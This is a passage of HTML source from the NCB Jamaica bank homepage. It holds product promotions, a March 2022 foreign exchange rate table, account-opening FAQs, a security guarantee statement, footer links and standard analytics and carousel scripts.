    <div class="plans-img arrow_box_right"><a href="https://www.jncb.com/Personal/Investing/Investment-Products"><img class='img-responsive owl-lazy' data-src='https://www.jncb.com/JNCB/media/Main-Librarie/Products/start-investing.jpg?ext=.jpg' /></a></div>
    <div class="tringle-right"></div>
    <div class="wrap-plans-text">     
      <a href="https://www.jncb.com/Personal/Investing/Investment-Products"><h4 class="plans-type-pv">Start Investing</h4></a>
      <p class="plans-description-pv"><span class="library-ncb-icon-font"><i class="icon-checkmark"></i></span>Make your money work for you by having investment as part of your financial holdings </p>
      <a href="https://www.jncb.com/Personal/Investing/Investment-Products" class="btn btn-primary btn-lg" type="button">VIEW MORE</a>
    </div>
  </div>
</div><div class="item">
  <div class="plans-box ">
    <div class="plans-img arrow_box_right"><a href="https://drive.jncb.com/?utm_source=homepage&utm_medium=small%20banner&utm_campaign=autoloan"><img class='img-responsive owl-lazy' data-src='https://www.jncb.com/JNCB/media/Main-Librarie/Products/Buy_a_car.jpg?ext=.jpg' /></a></div>
    <div class="tringle-right"></div>
    <div class="wrap-plans-text">     
      <a href="https://drive.jncb.com/?utm_source=homepage&utm_medium=small%20banner&utm_campaign=autoloan"><h4 class="plans-type-pv">Buy a Car</h4></a>
      <p class="plans-description-pv"><span class="library-ncb-icon-font"><i class="icon-checkmark"></i></span>Planning on buying a car? We&#39;ll help you get the car of your dreams. It&#39;s quick, easy and you can get approved now!</p>
      <a href="https://drive.jncb.com/?utm_source=homepage&utm_medium=small%20banner&utm_campaign=autoloan" class="btn btn-primary btn-lg" type="button">VIEW MORE</a>
    </div>
  </div>
</div>

</div>
</div><div role="tabpanel" id="businessHome" class="tab-pane fade">
  <div id="owl2" class="owl-carousel owl-theme">
  
<div class="item">
  <div class="plans-box ">
    <div class="plans-img arrow_box_right"><a href="https://www.jncb.com/Business/Credit-Cards/Credit-Cards-for-Business"><img class='img-responsive owl-lazy' data-src='https://www.jncb.com/JNCB/media/Main-Librarie/Products/Business-Credit-Card_1.jpg?ext=.jpg' /></a></div>
    <div class="tringle-right"></div>
    <div class="wrap-plans-text">     
      <a href="https://www.jncb.com/Business/Credit-Cards/Credit-Cards-for-Business"><h4 class="plans-type-pv">Choose a Business Credit Card</h4></a>
      <p class="plans-description-pv"><span class="library-ncb-icon-font"><i class="icon-checkmark"></i></span>Find the NCB credit card to fit your business needs. Select the card that rewards and help you manage your cash flow</p>
      <a href="https://www.jncb.com/Business/Credit-Cards/Credit-Cards-for-Business" class="btn btn-primary btn-lg" type="button">VIEW MORE</a>
    </div>
  </div>
</div><div class="item">
  <div class="plans-box ">
    <div class="plans-img arrow_box_right"><a href="https://www.jncb.com/Business/Loans-Financing/Quick-Cash-Flow"><img class='img-responsive owl-lazy' data-src='https://www.jncb.com/JNCB/media/Main-Librarie/Products/grow-your-business.jpg?ext=.jpg' /></a></div>
    <div class="tringle-right"></div>
    <div class="wrap-plans-text">     
      <a href="https://www.jncb.com/Business/Loans-Financing/Quick-Cash-Flow"><h4 class="plans-type-pv">Grow your business</h4></a>
      <p class="plans-description-pv"><span class="library-ncb-icon-font"><i class="icon-checkmark"></i></span>Need working capital for your business or to refinance debt? We can help you grow your business with one of unsecured loans. </p>
      <a href="https://www.jncb.com/Business/Loans-Financing/Quick-Cash-Flow" class="btn btn-primary btn-lg" type="button">VIEW MORE</a>
    </div>
  </div>
</div><div class="item">
  <div class="plans-box ">
    <div class="plans-img arrow_box_right"><a href="https://www.jncb.com/Business/Credit-Cards/Card-Merchant-Services"><img class='img-responsive owl-lazy' data-src='https://www.jncb.com/JNCB/media/Main-Librarie/Products/expand-your-payment-options.jpg?ext=.jpg' /></a></div>
    <div class="tringle-right"></div>
    <div class="wrap-plans-text">     
      <a href="https://www.jncb.com/Business/Credit-Cards/Card-Merchant-Services"><h4 class="plans-type-pv">Expand your  payment options</h4></a>
      <p class="plans-description-pv"><span class="library-ncb-icon-font"><i class="icon-checkmark"></i></span>NCB point-of-sales provide faster credit, debit and prepaid card processing. Manage your business efficiently with our electronic payments solutions.</p>
      <a href="https://www.jncb.com/Business/Credit-Cards/Card-Merchant-Services" class="btn btn-primary btn-lg" type="button">VIEW MORE</a>
    </div>
  </div>
</div><div class="item">
  <div class="plans-box ">
    <div class="plans-img arrow_box_right"><a href="https://www.jncb.com/Business/Banking/Online-Banking"><img class='img-responsive owl-lazy' data-src='https://www.jncb.com/JNCB/media/Main-Librarie/Products/Connect-to-your-accounts.jpg?ext=.jpg' /></a></div>
    <div class="tringle-right"></div>
    <div class="wrap-plans-text">     
      <a href="https://www.jncb.com/Business/Banking/Online-Banking"><h4 class="plans-type-pv">Connect to your accounts whenever</h4></a>
      <p class="plans-description-pv"><span class="library-ncb-icon-font"><i class="icon-checkmark"></i></span>Manage your business accounts at your convenience with secure Online Business Banking</p>
      <a href="https://www.jncb.com/Business/Banking/Online-Banking" class="btn btn-primary btn-lg" type="button">VIEW MORE</a>
    </div>
  </div>
</div><div class="item">
  <div class="plans-box ">
    <div class="plans-img arrow_box_right"><a href="https://www.jncb.com/Business/Banking/Value-Plans"><img class='img-responsive owl-lazy' data-src='https://www.jncb.com/JNCB/media/Main-Librarie/Products/Secured-loans.jpg?ext=.jpg' /></a></div>
    <div class="tringle-right"></div>
    <div class="wrap-plans-text">     
      <a href="https://www.jncb.com/Business/Banking/Value-Plans"><h4 class="plans-type-pv">Select the right business package</h4></a>
      <p class="plans-description-pv"><span class="library-ncb-icon-font"><i class="icon-checkmark"></i></span>Enjoy the benefits of customised business solutions that will save you time and money.</p>
      <a href="https://www.jncb.com/Business/Banking/Value-Plans" class="btn btn-primary btn-lg" type="button">VIEW MORE</a>
    </div>
  </div>
</div><div class="item">
  <div class="plans-box ">
    <div class="plans-img arrow_box_right"><a href="https://www.jncb.com/Business/Benefits-Insurance/Benefits-Insurance-Overview/SMART-Retirement-Plan"><img class='img-responsive owl-lazy' data-src='https://www.jncb.com/JNCB/media/Main-Librarie/Products/benefit-1.jpg?ext=.jpg' /></a></div>
    <div class="tringle-right"></div>
    <div class="wrap-plans-text">     
      <a href="https://www.jncb.com/Business/Benefits-Insurance/Benefits-Insurance-Overview/SMART-Retirement-Plan"><h4 class="plans-type-pv">Start planning your retirement journey</h4></a>
      <p class="plans-description-pv"><span class="library-ncb-icon-font"><i class="icon-checkmark"></i></span>Take control of your retirement and create the future you deserve. Be  SMART with your planning.</p>
      <a href="https://www.jncb.com/Business/Benefits-Insurance/Benefits-Insurance-Overview/SMART-Retirement-Plan" class="btn btn-primary btn-lg" type="button">VIEW MORE</a>
    </div>
  </div>
</div>

</div>
</div>
</div>
</div>
  </div>
</div>
  </section>
  <section class="section-rates">
    <div class="container">
  <div class="row">
    <div claSS="col-md-8">
  <h2>Quick Rates</h2>
<!--<ul class="nav nav-tabs nav-justified">
	<li class="active"><a data-toggle="tab" href="https://www.jncb.com/#fxRates">FX RATES</a></li>
	<li><a data-toggle="tab" href="https://www.jncb.com/#savRates">SAVING RATE</a></li>
	<li><a data-toggle="tab" href="https://www.jncb.com/#morRates">MORTGAGE</a></li>
	<li><a data-toggle="tab" href="https://www.jncb.com/#loaRates">LOAN RATE</a></li>
</ul>-->

<div class="tab-content">
<div class="tab-pane fade in active" id="fxRates">
<h3>Foreign Exchange Rates</h3>
      <a href="https://www.jncb.com/Support/Help-Resources/Foreign-Exchange-Services" class="btn btn-warning btn-lg">See more FX rates</a>
<div class="table-responsive">
  <table class="table table-responsive">
	<thead>
		<tr>
			<th>Currency</th>
			<th>Sell</th>
			<th>Buy (Cheque)</th>
			<th>Buy (Cash)</th>
		</tr>
	</thead>
	<tbody class="FxRContainer">
	<tr>
  <td><img src="https://www.jncb.com/JNCB/media/Main-Librarie/Flags/USD.png" />&nbsp;&nbsp;&nbsp;USD</td>
  <td>154.00</td>
  <td>146.00</td>
  <td>132.50</td>
</tr><tr>
  <td><img src="https://www.jncb.com/JNCB/media/Main-Librarie/Flags/GBP.png" />&nbsp;&nbsp;&nbsp;GBP</td>
  <td>203.50</td>
  <td>198.40</td>
  <td>194.90</td>
</tr><tr>
  <td><img src="https://www.jncb.com/JNCB/media/Main-Librarie/Flags/CAD.png" />&nbsp;&nbsp;&nbsp;CAD</td>
  <td>122.40</td>
  <td>118.00</td>
  <td>115.00</td>
</tr><tr>
  <td><img src="https://www.jncb.com/JNCB/media/Main-Librarie/Flags/EUR.png" />&nbsp;&nbsp;&nbsp;EUR</td>
  <td>172.20</td>
  <td>165.30</td>
  <td>162.30</td>
</tr> </tbody>
</table>

</div>
</div>

<div class="tab-pane fade" id="savRates">
<h3>Foreign Exchange Rates</h3>

<div class="table-responsive">
<table class="table">
	<thead>
		<tr>
			<th>Currency</th>
			<th>Sell</th>
			<th>Buy Cheque</th>
			<th>Buy Cash</th>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td>USD</td>
			<td>$0.00</td>
			<td>$0.00</td>
			<td>$0.00</td>
		</tr>
		<tr>
			<td>GBP</td>
			<td>$0.00</td>
			<td>$0.00</td>
			<td>$0.00</td>
		</tr>
		<tr>
			<td>CAD</td>
			<td>$0.00</td>
			<td>$0.00</td>
			<td>$0.00</td>
		</tr>
		<tr>
			<td>EUR</td>
			<td>$0.00</td>
			<td>$0.00</td>
			<td>$0.00</td>
		</tr>
	</tbody>
</table>
</div>
</div>

<div class="tab-pane fade" id="morRates">
<h3>Foreign Exchange Rates</h3>

<div class="table-responsive">
<table class="table">
	<thead>
		<tr>
			<th>Currency</th>
			<th>Sell</th>
			<th>Buy Cheque</th>
			<th>Buy Cash</th>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td>USD</td>
			<td>$0.00</td>
			<td>$0.00</td>
			<td>$0.00</td>
		</tr>
		<tr>
			<td>GBP</td>
			<td>$0.00</td>
			<td>$0.00</td>
			<td>$0.00</td>
		</tr>
		<tr>
			<td>CAD</td>
			<td>$0.00</td>
			<td>$0.00</td>
			<td>$0.00</td>
		</tr>
		<tr>
			<td>EUR</td>
			<td>$0.00</td>
			<td>$0.00</td>
			<td>$0.00</td>
		</tr>
	</tbody>
</table>
</div>
</div>

<div class="tab-pane fade" id="loaRates">
<h3>Foreign Exchange Rates</h3>

<div class="table-responsive">
<table class="table">
	<thead>
		<tr>
			<th>Currency</th>
			<th>Sell</th>
			<th>Buy Cheque</th>
			<th>Buy Cash</th>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td>USD</td>
			<td>$0.00</td>
			<td>$0.00</td>
			<td>$0.00</td>
		</tr>
		<tr>
			<td>GBP</td>
			<td>$0.00</td>
			<td>$0.00</td>
			<td>$0.00</td>
		</tr>
		<tr>
			<td>CAD</td>
			<td>$0.00</td>
			<td>$0.00</td>
			<td>$0.00</td>
		</tr>
		<tr>
			<td>EUR</td>
			<td>$0.00</td>
			<td>$0.00</td>
			<td>$0.00</td>
		</tr>
	</tbody>
</table>
</div>
</div>

</div><div style="padding-top: 10px; font-size:  13px;">Effective Date: March 11, 2022 7:00 PM (Rates are subject to change) 
<!--Effective Date: March 11, 2022 07:00 PM (Rates are subject to change) --> </div></div>

<div class="col-md-4">
  <h2>F.A.Q.</h2>
<div class="question-box">
<div class="panel-group" id="accordion" role="tablist" aria-multiselectable="true">


<div class="panel panel-default">
  <div class="panel-heading" role="tab" id="headingOne">
    <h4 class="panel-title">
      <a role="button" data-toggle="collapse" data-parent="#accordion" href="https://www.jncb.com/#collapse147" aria-expanded="true" aria-controls="collapse147" class="accordion-toggle collapsed">
        How can I open a bank account online without visiting branch?
      </a>
    </h4>
  </div>
  <div id="collapse147" class="panel-collapse collapse" role="tabpanel" aria-labelledby="heading147">
    <div class="panel-body">
      <p>Are you new to NCB? You may open a Regular Save savings account at <a href="http://www.jncb.com/openaccountonline/">www.jncb.com/openaccountonline</a>. &nbsp;<br />
<br />
If you are an existing customer, you may open any savings account via <a href="https://www.jncb.com/internetbanking?rd=RetailLogon">Personal Online Banking</a>&nbsp; - <strong>Under Quick Links --&gt; New Account.</strong>&nbsp;</p>

    </div>
  </div>
</div>

<div class="panel panel-default">
  <div class="panel-heading" role="tab" id="headingOne">
    <h4 class="panel-title">
      <a role="button" data-toggle="collapse" data-parent="#accordion" href="https://www.jncb.com/#collapse148" aria-expanded="true" aria-controls="collapse148" class="accordion-toggle collapsed">
        What are the requirements to open a bank account?
      </a>
    </h4>
  </div>
  <div id="collapse148" class="panel-collapse collapse" role="tabpanel" aria-labelledby="heading148">
    <div class="panel-body">
      <p>You may open an account online or at any NCB Branch. You will find the requirements at&nbsp;&nbsp;<a href="https://www.jncb.com/Personal/Banking/PersonalAccountRequirements">Personal Account Requirements</a>.</p>

    </div>
  </div>
</div>

<div class="panel panel-default">
  <div class="panel-heading" role="tab" id="headingOne">
    <h4 class="panel-title">
      <a role="button" data-toggle="collapse" data-parent="#accordion" href="https://www.jncb.com/#collapse149" aria-expanded="true" aria-controls="collapse149" class="accordion-toggle collapsed">
        How much money do I need to open a bank account?
      </a>
    </h4>
  </div>
  <div id="collapse149" class="panel-collapse collapse" role="tabpanel" aria-labelledby="heading149">
    <div class="panel-body">
      <ul>
	<li>J$100 NCB START (up to 17&nbsp;years of age)</li>
	<li>J$2,000 NCB Regular Save</li>
	<li>J$5,000 NCB Gold Club (age 55 and over)</li>
	<li>J$5,000 NCB Chequing Account</li>
	<li>J$10,000 NCB Sunshine Savers</li>
	<li>100 units of foreign currency (US, Can, Pound, Euro)</li>
</ul>

    </div>
  </div>
</div>

<div class="panel panel-default">
  <div class="panel-heading" role="tab" id="headingOne">
    <h4 class="panel-title">
      <a role="button" data-toggle="collapse" data-parent="#accordion" href="https://www.jncb.com/#collapse150" aria-expanded="true" aria-controls="collapse150" class="accordion-toggle collapsed">
        How do I set up online banking?
      </a>
    </h4>
  </div>
  <div id="collapse150" class="panel-collapse collapse" role="tabpanel" aria-labelledby="heading150">
    <div class="panel-body">
      <p>To get started, go to www.jncb.com and select<strong>&nbsp;Enroll Now </strong>or&nbsp; click Sign Up on <a href="https://www.jncb.com/Personal/Banking/Online-Banking">Online Banking Page</a>. You may also sign up via the mobile app in the <a href="http://play.google.com/store/apps/details?id=com.jncb.mobile&amp;hl=en">Google</a> or <a href="https://apps.apple.com/us/app/ncb-mobile/id1435405040">Apple</a> Store.&nbsp;</p>

    </div>
  </div>
</div>


</div>
</div>
<br />
<a href="https://www.jncb.com/Support/Help-Resources/FAQ" class="btn btn-primary btn-lg" type="button">ALL FAQs</a>
</div>
  </div>
</div>
  </section>
  <section class="section-2">
    <div class="container">
  <div class="row">
    <h2 class="title-search-box">Looking for something else?



</h2><div id="p_lt_ctl03_pageplaceholder_p_lt_ctl04_SmartSearchBox_pnlSearch" class="searchBox">
	
    <label for="p_lt_ctl03_pageplaceholder_p_lt_ctl04_SmartSearchBox_txtWord" id="p_lt_ctl03_pageplaceholder_p_lt_ctl04_SmartSearchBox_lblSearch">Search for:</label>
    <input name="p$lt$ctl03$pageplaceholder$p$lt$ctl04$SmartSearchBox$txtWord" type="text" maxlength="1000" id="p_lt_ctl03_pageplaceholder_p_lt_ctl04_SmartSearchBox_txtWord" class="form-control" />
    <input type="submit" name="p$lt$ctl03$pageplaceholder$p$lt$ctl04$SmartSearchBox$btnSearch" value="Search" id="p_lt_ctl03_pageplaceholder_p_lt_ctl04_SmartSearchBox_btnSearch" class="btn btn-default" />
    
    <div id="p_lt_ctl03_pageplaceholder_p_lt_ctl04_SmartSearchBox_pnlPredictiveResultsHolder" class="predictiveSearchHolder">

	</div>

</div>

  </div>
</div>
  </section>
  <section class="section-3 lazy" data-original="/JNCB/media/Main-Librarie/google-map-home.jpg">
    <div class=container">
<div class="col-sm-6">
<div class="serchBoxMapHome">
  <div class="mapItemsHolder">
    <div class="bubbleSpeach">
      <h4>Find an NCB Branch or ABM</h4>
    </div>
   <div id="p_lt_ctl03_pageplaceholder_p_lt_ctl05_SmartSearchBox1_pnlSearch" class="searchBox">
	
    <label for="p_lt_ctl03_pageplaceholder_p_lt_ctl05_SmartSearchBox1_txtWord" id="p_lt_ctl03_pageplaceholder_p_lt_ctl05_SmartSearchBox1_lblSearch">Search for:</label>
    <input name="p$lt$ctl03$pageplaceholder$p$lt$ctl05$SmartSearchBox1$txtWord" type="text" maxlength="1000" id="p_lt_ctl03_pageplaceholder_p_lt_ctl05_SmartSearchBox1_txtWord" class="form-control" />
    <input type="submit" name="p$lt$ctl03$pageplaceholder$p$lt$ctl05$SmartSearchBox1$btnSearch" value="Search" id="p_lt_ctl03_pageplaceholder_p_lt_ctl05_SmartSearchBox1_btnSearch" class="btn btn-default" />
    
    <div id="p_lt_ctl03_pageplaceholder_p_lt_ctl05_SmartSearchBox1_pnlPredictiveResultsHolder" class="predictiveSearchHolder">

	</div>

</div>
<a href="https://www.jncb.com/Support/Locate/Branches-ABMs">VIEW All LOCATIONS <span class="library-ncb-icon-font"><i class="icon-chevron-right"></i></span></a>  
</div>
</div>
</div>
</div>

  </section>
  <section class="section-4">
    <div class="container">
  <div class="row">
    <div class="col-sm-4 hidden-xs">
<div class="quote-wrap-left"><p class="quote-style-left">&ldquo;My business has never run smoother.&rdquo;</p>
<span class="quote-cit">&ndash; Daniel, St. Thomas</span></div>
</div><div class="col-sm-8">
<div class="quote-wrap-right text-left"><p class="quote-style-left">&ldquo;I&rsquo;ve banked with NCB for 20 years. The service and expertise is unmatched by any other bank.&rdquo;</p>
<span class="quote-cit">&ndash; Sophia, Kingston</span></div>

</div>
  </div>
</div>
  </section>
  <section class="section-5 lazy" data-original="/JNCB/media/Main-Librarie/video-bg.jpg">
    <div class="container">
  <div class="row">
    <div class="col-sm-offset-2 col-sm-8 text-center">
<h2>NCB is a proud supporter of Jamaican Excellence for over 175 years



</h2></div><div class="col-sm-12 text-center">
<a class="popup-youtube" href="https://www.youtube.com/watch?v=OuXexw0T5hk" data-effect="mfp-move-from-top" target="_blank"></a></div>
<div class="col-sm-12 text-center section-social">
<a href="https://www.facebook.com/NCBJa" target="_blank"><img src="https://www.jncb.com/JNCB/media/Main-Librarie/facebook_1.png" /></a> <a href="https://twitter.com/ncbja" target="_blank"><img src="https://www.jncb.com/JNCB/media/Main-Librarie/twitter_1.png" /></a> <a href="https://www.instagram.com/ncbjamaica/" target="_blank"><img src="https://www.jncb.com/JNCB/media/Main-Librarie/instagram_1.png" /></a></div>
<div class="col-sm-12 text-center">
<a href="https://www.instagram.com/explore/tags/excellenceja/" target="_blank">#EXCELLENCEJA</a>
</div>

  </div>
</div>
  </section>
  <section class="section-6">
    <div class="container">
  <div class="row">
    <div class="col-md-7">



</div><div class="col-md-5">
  <a href="https://www.jncb.com/About-Us/Corporate-Social-Responsibility">Corporate Social Responsibility



</a>
</div>
  </div>
</div>
  </section>
  <section class="section-7">
    <div class="container">
  <div class="row">
    <div class="col-sm-4 hidden-xs"><img alt="" class="img-responsive lazy" data-original="/JNCB/media/Main-Librarie/device-home.png" /></div><div class="col-sm-8 text-right"><img alt="" class="img-responsive lazy" data-original="/JNCB/media/Main-Librarie/Award-quote.png" /><a href="https://www.jncb.com/About-Us/Company-Overview/Awards">VIEW AWARDS LIST<span class="library-ncb-icon-font"><b class="icon-chevron-right"></b></span></a>
</div>
  </div>
</div>
  </section>
  <section class="section-8">
    <div class="container">
  <div class="row">
    <h2 class="text-center">Online Security Guarantee



</h2><div class="col-sm-4 hidden-xs">
  <div class="home-features-box text-center">
<span class="library-ncb-icon-font"><b class="icon-users"></b></span>
  <h5>Our Commitment</h5>
    <p style="text-align:left;">National Commercial Bank Jamaica Limited is a strong and secure organization committed to serving its customers&#39; financial needs. This commitment extends to the services offered on our online internet banking platform; tested and proven to secure your personal information.



</p>
</div>
</div><div class="col-sm-4">
  <div class="home-features-box text-center">
<span class="library-ncb-icon-font"><b class="icon-lock"></b></span>
  <h5>Your Security</h5>
    <p style="text-align:left;">We are serious about protecting your privacy and the security of your banking information. NCB uses advanced technology to protect the confidentiality of your financial activities while you are transacting business online.



</p>
</div>
</div><div class="col-sm-4 hidden-xs">
  <div class="home-features-box text-center">
<span class="library-ncb-icon-font"><b class="icon-award2"></b></span>
  <h5>Our Guarantee</h5>
    <p style="text-align:left;">We guarantee full reimbursement of funds removed from your NCB accounts in the unlikely event that through no fault of yours someone you have not authorized or provided with your login information, removes those funds through our online services.



</p>
</div>
</div><div class="col-xs-12">
<a href="https://www.jncb.com/Support/Security/Security-Guarantee" class="btn btn-primary btn-lg" type="button">VIEW MORE</a></div>
<script type="text/javascript">
	//<![CDATA[
$(function() {
    $("img.lazy").lazyload({
effect : "fadeIn"
});
});
//]]>
</script>
<script type="text/javascript">
	//<![CDATA[
$(function() {
    $("section.lazy").lazyload({
effect : "fadeIn"
});
});
//]]>
</script>
  </div>
</div>
  </section>
</div>
<!--<script src="https://www.jncb.com/CMSPages/GetResource.ashx?scriptfile=/Jncb/js/jquery.lazyload.js" type="text/javascript"></script>-->
</div>

<!-- Footer -->
<footer id="footer">
  <div class="container">
    <div class="row footer-top">
      <h2  class="title-section text-center white">Put Your Best Life Forward



</h2><div class="col-xs-6 col-sm-4 col-md-2"><div class="nav-column-footer">
<h5 class="yellow">support</h5>

<ul>
	<li><a href="https://www.jncb.com/Support/Help-Resources/FAQ">FAQ</a></li>
	<li><a href="https://www.jncb.com/support/contact/contact-us">Contact Us</a></li>
	<li><a href="https://www.jncb.com/Support/Locate/Branches-ABMs">Branches &amp; ABMs</a></li>
	<li><a href="https://freelance.jncb.com" target="_blank">Freelance Portal</a></li>
	<li><a href="https://www.jncb.com/Support/Help-Resources/All-Form-Downloads">All Form Downloads</a></li>
	<li><a href="https://www.jncb.com/Special-Pages/Site-Map">Site Map</a></li>
</ul>
</div>
</div><div class="nav-column-no col-xs-6 col-sm-4 col-md-2"><div class="nav-column-footer">
<h5 class="yellow">about us</h5>

<ul>
	<li><a href="https://www.jncb.com/About-Us/Company-Overview/Who-We-Are">Who We Are</a></li>
	<li><a href="https://www.jncb.com/About-Us/Company-Overview/History">History</a></li>
	<li><a href="https://www.jncb.com/About-Us/Corporate-Social-Responsibility">Corporate Social Responsibility</a></li>
	<li><a href="https://www.jncb.com/About-Us/Company-Overview/Awards">Awards</a></li>
	<li><a href="https://www.jncb.com/About-Us/NCB-Opportunities/Careers-Site">Careers Site</a></li>
	<li><a href="https://www.jncb.com/About-Us/News-Room/News">News</a></li>
	<li><a href="https://www.jncb.com/About-Us/News-Room/Brand-Media-Guides">Brand &amp; Media Guides</a></li>
	<li><a href="https://www.jncb.com/About-Us/Company-Overview/Management-Team" target="_blank">Management Team</a><a href="https://www.jncb.com/About-Us/Investor-Relations/Investor-Relations" target="_blank">&nbsp;</a></li>
	<li><a href="https://www.jncb.com/About-Us/Reports/Information" target="_blank">Investor Relations</a></li>
</ul>
</div>
</div><div class="col-xs-6 col-sm-4 col-md-2"><div class="nav-column-footer">
<h5 class="yellow">security</h5>

<ul>
	<li><a href="https://www.jncb.com/Support/Security/Security-Guarantee">Security Guarantee</a></li>
	<li><a href="https://www.jncb.com/Support/Security/Protecting-Yourself">Protect Yourself</a></li>
	<li><a href="https://www.jncb.com/reportphishing">Report Phishing</a></li>
</ul>
</div>
</div><div class="col-xs-6 col-sm-4 col-md-2"><div class="nav-column-footer">
<h5 class="yellow">fees &amp; rates</h5>

<ul>
	<li><a href="https://www.jncb.com/Support/Help-Resources/Fees">Fee Guide</a></li>
	<li><a href="https://www.jncb.com/Support/Help-Resources/How-to-Avoid-Fees" target="_blank">How to Avoid Fees</a></li>
	<li><a href="https://www.jncb.com/Personal/Banking/Foreign-Exchange-Rates-Services" target="_blank">Foreign Exchange Rates</a></li>
	<li><a href="https://www.jncb.com/Support/Help-Resources/Deposit-Rates/Lending-Rates" target="_blank">Lending Rates</a></li>
	<li><a href="https://www.jncb.com/Support/Help-Resources/Deposit-Rates/Savings-Local" target="_blank">Saving Rates</a></li>
</ul>
</div>
</div><div class="col-xs-6 col-sm-4 col-md-2">
<div class="nav-column-footer"><h5 class="yellow">affiliate sites</h5>

<ul>
	<li><a href="http://www.ncbcayman.com/" target="_blank">NCB Cayman</a></li>
	<li><a href="http://ncbcapitalmarkets.com/" target="_blank">NCB Capital Markets</a></li>
	<li><a href="https://www.jncb.com/About-Us/Corporate-Social-Responsibility" target="_blank">NCB Foundation</a></li>
	<li><a href="https://www.jncb.com/Support/Locate/Branches-ABMs?page=41" target="_blank">NCB United Kingdom</a></li>
	<li><a href="http://ncbinsurance.com/" target="_blank">NCB Insurance Company </a></li>
	<li><a href="http://ncbglobalfinance.com/" target="_blank">NCB Global Finance</a></li>
	<li><a href="https://www.myncb.com" target="_blank">NCB Financial Group</a></li>
	<li><a href="https://www.myncb.com/Special-Pages/NCB-Capital-Markets-Barbados-Limited" target="_blank">NCB Capital Markets (Barbados)</a></li>
</ul>
</div>
</div><div class="col-xs-12 col-sm-4 col-md-2"><div class="nav-column-footer">
<h5 class="yellow">follow us</h5>

<ul class="nav-social-icons">
	<li><a href="https://www.linkedin.com/company/national-commercial-bank-jamaica-limited" target="_blank"><img alt="" src="https://www.jncb.com/JNCB/media/Main-Librarie/linkedin.png" /></a></li>
	<li><a href="https://www.facebook.com/NCBJa" target="_blank"><img alt="" src="https://www.jncb.com/JNCB/media/Main-Librarie/facebook.png" /></a></li>
	<li><a href="https://twitter.com/ncbja" target="_blank"><img alt="" src="https://www.jncb.com/JNCB/media/Main-Librarie/twitter.png" /></a></li>
	<li><a href="https://plus.google.com/+Jncbfinancial" target="_blank"><img alt="" src="https://www.jncb.com/JNCB/media/Main-Librarie/google-plus.png" /></a></li>
	<li><a href="https://www.instagram.com/ncbjamaica/" target="_blank"><img alt="~" src="https://www.jncb.com/JNCB/media/Main-Librarie/instagram.png" /></a></li>
	<li><a href="https://www.youtube.com/user/ncbja" target="_blank"><img alt="" src="https://www.jncb.com/JNCB/media/Main-Librarie/you-tube.png" /></a></li>
</ul>
</div>
</div>
    </div>
    <div class="row footer-down">
      <div class="col-xs-6 col-sm-4">
  <div class="contact-column-footer text-center">
<div class="contact-icon-footer library-ncb-icon-font"><a href="https://www.jncb.com/Support/Locate/Branches-ABMs"><i class="icon-location">&nbsp;</i></a></div>

<div class="contact-info-footer">
<h5 class="contact-title-footer white"><a href="https://www.jncb.com/Support/Locate/Branches-ABMs">branches &amp; abms</a></h5>
<a href="https://www.jncb.com/Support/Locate/Branches-ABMs"><b>Locations &amp; Hours</b></a></div>
</div>

</div><div class="col-xs-6 col-sm-4">
  <div class="contact-column-footer text-center">
<div class="contact-icon-footer library-ncb-icon-font"><a href="https://www.jncb.com/tel:888-622-3477"><i class="icon-headset">&nbsp;</i></a></div>

<div class="contact-info-footer">
<h5 class="contact-title-footer white"><a href="https://www.jncb.com/tel:888-622-3477">customer care</a></h5>
<a href="https://www.jncb.com/tel:888-622-3477"><b>888-622-3477</b></a></div>
</div>

</div><div class="col-xs-6 col-sm-4">
  <div class="contact-column-footer text-center">
<div class="contact-icon-footer library-ncb-icon-font"><a href="https://www.jncb.com/tel:876-929-4622"><i class="icon-phone">&nbsp;</i></a></div>

<div class="contact-info-footer">
<h5 class="contact-title-footer white"><a href="https://www.jncb.com/tel:876-929-4622">branch services</a></h5>
<a href="https://www.jncb.com/tel:876-929-4622"><b>876-929-4622</b> </a></div>
</div>

</div>
    </div>
  </div>
  <div class="footer-bottom">
    <div class="container">
      <div class="row">
        <div class="col-sm-4 col-md-4 text-left">
  &copy; Copyright 1999-2022 NCB Jamaica. All Rights Reserved.
</div><div class="col-sm-4 col-md-4 text-center">
  <a href="https://www.jncb.com/Special-Pages/Privacy-Policy">Privacy Policy</a> | <a href="https://www.jncb.com/Special-Pages/Terms-of-use">Terms of use</a>
</div><div class="col-sm-4 col-md-4 text-right">
  Member of:&nbsp;<a href="http://www.jba.org.jm/" target="_blank"><img alt="jba-logo" src="https://www.jncb.com/JNCB/media/Main-Librarie/jba-logo-white.png" style="width: 59px; height: 31px;" title="jba" /></a>&nbsp;&nbsp;<a href="https://www.jncb.com/ http://www.jdic.org/" target="_blank"><img alt="jdic" src="https://www.jncb.com/JNCB/media/Main-Librarie/jdic.png" style="width: 36px; height: 39px;" title="jdic" /></a>
</div>
      </div>
    </div>
  </div>
</footer>

<!--<script src="https://www.jncb.com/CMSPages/GetResource.ashx?scriptfile=/Jncb/assets/js/concatenated.min.js" type="text/javascript"></script>-->
<!--<script src="https://www.jncb.com/CMSPages/GetResource.ashx?scriptfile=/Jncb/js/bootstrap.min.js" type="text/javascript"></script>-->

<!-- Google Analytics -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-47167941-1', 'auto');
  ga('send', 'pageview');

</script>

<!-- Global site tag (gtag.js) - Google Ads: 972130873 -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-972130873"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
 
  gtag('config', 'AW-972130873');
</script>
    
    
<script>
  $("#menu").eosMenu();
  
  // Get the button that opens the modal
  function overlay() {
    var modal = document.getElementById('menu-overlay');
  if (modal.style.display === 'block') {
    modal.style.display = 'none';
  } else {
    modal.style.display = 'block';
  }
}
</script>

<script type="text/javascript">
	//<![CDATA[
$('.owl-carousel').owlCarousel({
  center: false,
  items:2,
  lazyLoad:true,
  loop:true,
  margin:30,
  nav:true,
